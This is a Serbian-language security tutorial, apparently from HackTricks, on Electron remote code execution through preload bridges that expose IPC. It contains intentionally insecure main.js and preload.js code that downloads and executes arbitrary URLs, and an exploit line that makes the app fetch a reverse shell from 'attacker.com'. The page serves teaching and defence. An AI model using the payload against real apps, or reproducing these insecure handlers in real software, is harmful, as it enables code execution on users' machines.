# Electron RCE putem IPC-a uz contextIsolation

{{#include ../../banners/hacktricks-training.md}}

Izolacija konteksta ne čini nebezbedan preload bridge bezbednim. Ako preload izlaže privilegovani IPC renderer sadržaju, XSS ili kompromitovani renderer može da pozove taj bridge; RCE zatim zavisi od validacije i mogućnosti odgovarajućeg rukovaoca u glavnom procesu. Electron preporučuje da se za svaku operaciju izloži po jedna usko definisana metoda, da se validiraju IPC pošiljaoci i da se nikada ne izlažu sirovi IPC primitivni elementi.<sup>[[3]](#references)[[4]](#references)</sup>

**Većina ovih primera preuzeta je odavde** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). Pogledajte video za više informacija.<sup>[[1]](#references)</sup>

## Primer 0

Primer sa [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21) (na slajdovima je prikazan ceo primer zloupotrebe XSS-a za RCE u MS Teams-u; ovo je samo veoma osnovni primer):<sup>[[2]](#references)</sup>

<figure><img src="../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Primer 1

Pogledajte kako `main.js` osluškuje `getUpdate` i **preuzima i izvršava bilo koji prosleđeni URL**.\
Pogledajte i kako `preload.js` **izlaže svaki IPC događaj** iz glavnog procesa.

```javascript
// Part of code of main.js
ipcMain.on("getUpdate", (event, url) => {
  console.log("getUpdate: " + url)
  mainWindow.webContents.downloadURL(url)
  mainWindow.download_url = url
})

mainWindow.webContents.session.on(
  "will-download",
  (event, item, webContents) => {
    console.log("downloads path=" + app.getPath("downloads"))
    console.log("mainWindow.download_url=" + mainWindow.download_url)
    url_parts = mainWindow.download_url.split("/")
    filename = url_parts[url_parts.length - 1]
    mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
    console.log("downloadPath=" + mainWindow.downloadPath)
    // Set the save path, making Electron not to prompt a save dialog.
    item.setSavePath(mainWindow.downloadPath)

    item.on("updated", (event, state) => {
      if (state === "interrupted") {
        console.log("Download is interrupted but can be resumed")
      } else if (state === "progressing") {
        if (item.isPaused()) console.log("Download is paused")
        else console.log(`Received bytes: ${item.getReceivedBytes()}`)
      }
    })

    item.once("done", (event, state) => {
      if (state === "completed") {
        console.log("Download successful, running update")
        fs.chmodSync(mainWindow.downloadPath, 0755)
        var child = require("child_process").execFile
        child(mainWindow.downloadPath, function (err, data) {
          if (err) {
            console.error(err)
            return
          }
          console.log(data.toString())
        })
      } else console.log(`Download failed: ${state}`)
    })
  }
)
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```

Exploit:

```html
<script>
  electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
</script>
```

## Primer 2

Ako preload izloži `shell.openExternal` bez provere scheme-a i odredišta, ulazom kojim upravlja renderer mogu se pokrenuti registrovani eksterni handler-i. Da li će to dovesti do izvršavanja koda zavisi od platforme, instaliranih handler-a, scheme-a i verzije Electron-a; ograničite to na eksplicitnu listu dozvoljenih očekivanih `https:` odredišta.<sup>[[3]](#references)</sup>

```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
  shell.openExternal(url)
}
```

## Primer 3

Ako preload izlaže neograničenu komunikaciju sa glavnim procesom, XSS može da šalje proizvoljne nazive kanala i podatke. Uticaj zavisi od registrovanih IPC handlera i njihovih provera autorizacije.

```javascript
window.electronListen = (event, cb) => {
  ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```


## References

- [1] [Hakovanje savremenih desktop aplikacija pomoću XSS-a i RCE-a — radionica](https://www.youtube.com/watch?v=xILfQGkLXQo)
- [2] [Kako sam hakovao Microsoft Teams i dobio 150.000 dolara na Pwn2Own takmičenju](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
- [3] [Electron — bezbednosna kontrolna lista](https://www.electronjs.org/docs/latest/tutorial/security)
- [4] [Electron — izolacija konteksta i bezbedno izlaganje API-ja](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
{{#include ../../banners/hacktricks-training.md}}
